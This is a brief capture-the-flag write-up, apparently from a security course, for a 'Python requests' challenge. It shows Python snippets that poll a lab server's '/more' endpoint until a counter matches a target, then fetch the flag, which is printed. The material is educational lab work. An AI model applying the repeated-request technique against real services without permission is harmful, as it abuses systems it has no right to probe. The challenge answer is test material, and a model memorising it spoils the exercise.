# Challenge `Python requests` Writeup

- Vulnerability: 
  - brute-force attack
- Where:
  - `/more` endpoint
- Impact:
  - allows to find the server's guess by repeated requests

## Analyzing the server

This challenges consists in guessing a random number generated by the server.
By sending a request to `/hello` endpoint, the server responds with a `current` value and a `target` value.
By sending a request to `/more` endpoint, the `current` value increases or decreases by a random amount.
The flag is obtained by sending a request to `/finish` when the `current` value is equal to the `target` value.
The server's session is associated with cookies, so all requests must be sent with it.

## Exploit

First send a request to `/hello` to obtain a cookie and the `current` and `target` values. 
```python
r = session.get(URL+"hello")
lines = r.text.split("<br>")
target = lines[0].split(" ")[-1][:-1]
current = lines[1].split(" ")[-1]
```
If they are different, send requests to `/more` until they are the same.
```python
r = session.get(URL+"more")
lines = r.text.split("<br>")
current = lines[2].split(" ")[-1]
```
Finally send a request to `/finish` to obtain the flag `SSof{Python_requests_is_a_good_complement_to_ZAP}`.
```python
r = session.get(URL+"finish")
flag = r.text.split(" ")[-1]
```

## Implementation

These code snippets and full implementation can be found [here](python_requests.py).
